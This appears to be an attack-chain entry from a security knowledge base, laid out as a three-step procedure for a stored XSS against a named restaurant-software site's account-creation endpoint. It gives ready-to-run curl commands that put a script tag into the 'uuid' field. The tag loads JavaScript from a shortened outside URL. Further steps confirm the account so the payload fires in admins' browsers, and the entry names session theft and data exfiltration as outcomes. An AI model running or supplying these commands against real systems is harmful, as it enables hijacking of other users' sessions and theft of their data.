---
id: ac-stored-xss-uuid-upserve
tags:
  - xss
  - stored-xss
  - uuid-injection
  - account-creation
type: attack_chain
tools:
  - '[[tools/is-gd-url-shortener]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Submit-Malicious-UUID-for-Account-Creation]]'
  - '[[procedures/Confirm-Account-via-Email-Link]]'
  - '[[procedures/Trigger-Stored-XSS-by-Viewing-Account]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:58.112Z'
description: >-
  A multi-step attack exploiting lack of server-side validation on UUID fields
  to inject and execute stored XSS payloads during user account creation,
  leading to arbitrary JavaScript execution on viewers.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Stored XSS via Custom UUID Injection in User Account Creation

Multi-stage attack chain demonstrating exploitation of insufficient UUID validation to store and execute XSS payloads in a web application, targeting admin panels and authenticated users.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Submit Malicious UUID] --> B[Confirm Account Creation]
    B --> C[View Account Details to Execute XSS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/is-gd-url-shortener]]

### Target Environment

- Web application with user account creation endpoint (e.g., POST /c/user)
- Access to email for confirmation
- No authentication required for initial submission

### Initial Access Requirements

- Public access to the registration endpoint
- Ability to receive emails
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Submit Malicious UUID
procedure: [[procedures/Submit-Malicious-UUID-for-Account-Creation]]

**Objective**: Inject a stored XSS payload into the UUID field during account creation to bypass client-side restrictions and store malicious JavaScript.

**Instructions**: Use [[commands/post-create-user-with-xss-uuid-form-urlencoded]] to send a POST request with the crafted payload:

```bash
curl -X POST https://app.upserve.com/c/user \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "uuid=\</script\><script src=//is.gd/z0i2sU>&email=your.email@example.com&brand_pretty_url=test-brand"
```

Alternatively, test with JSON format using [[commands/post-create-user-with-xss-uuid-json]] if form-urlencoded fails:

```bash
curl -X POST https://app.upserve.com/c/user \
  -H "Content-Type: application/json" \
  -d '{"uuid":"\</script\><script src=//is.gd/z0i2sU>","email":"your.email@example.com","brand_pretty_url":"test-brand"}'
```

**Expected Output**: HTTP 201 Created response with account details; email sent with confirmation link. Note: Server may override UUID in some cases, so verify payload acceptance.

**Success Indicators**:
- Account creation response received
- Confirmation email arrives with token

### Step 2: Confirm Account Creation
procedure: [[procedures/Confirm-Account-via-Email-Link]]

**Objective**: Activate the account to persist the malicious UUID in the database, making the XSS payload live.

**Instructions**: Retrieve the confirmation link from the email and visit it using [[commands/visit-email-confirmation-link]]:

```bash
curl -X GET "https://app.upserve.com/b/test-brand?email_token=your_token_here" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

Or open in a browser to simulate user interaction.

**Expected Output**: Account activation confirmation; redirect to dashboard or success page.

**Success Indicators**:
- Account status changes to active
- No errors in activation

### Step 3: Trigger Stored XSS Execution
procedure: [[procedures/Trigger-Stored-XSS-by-Viewing-Account]]

**Objective**: Load the affected account details in a context where the UUID is rendered, executing the injected JavaScript on the viewer's browser.

**Instructions**: As an admin or authenticated user, navigate to the account details page (e.g., admin panel) that displays the UUID. The payload executes automatically upon page load due to improper escaping in YUI namespace.

Monitor network requests or use browser dev tools to confirm external script load from the shortened URL.

**Expected Output**: JavaScript from //is.gd/z0i2sU executes, potentially alerting or performing actions like session theft.

**Success Indicators**:
- External script loads in network tab
- Alert or payload effects visible (e.g., DOM manipulation)

## Attack Chain Summary

### Key Achievements

1. Bypassed UUID validation to store XSS payload
2. Persisted payload via account confirmation
3. Achieved arbitrary JS execution on viewers, enabling session hijacking or data exfiltration

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
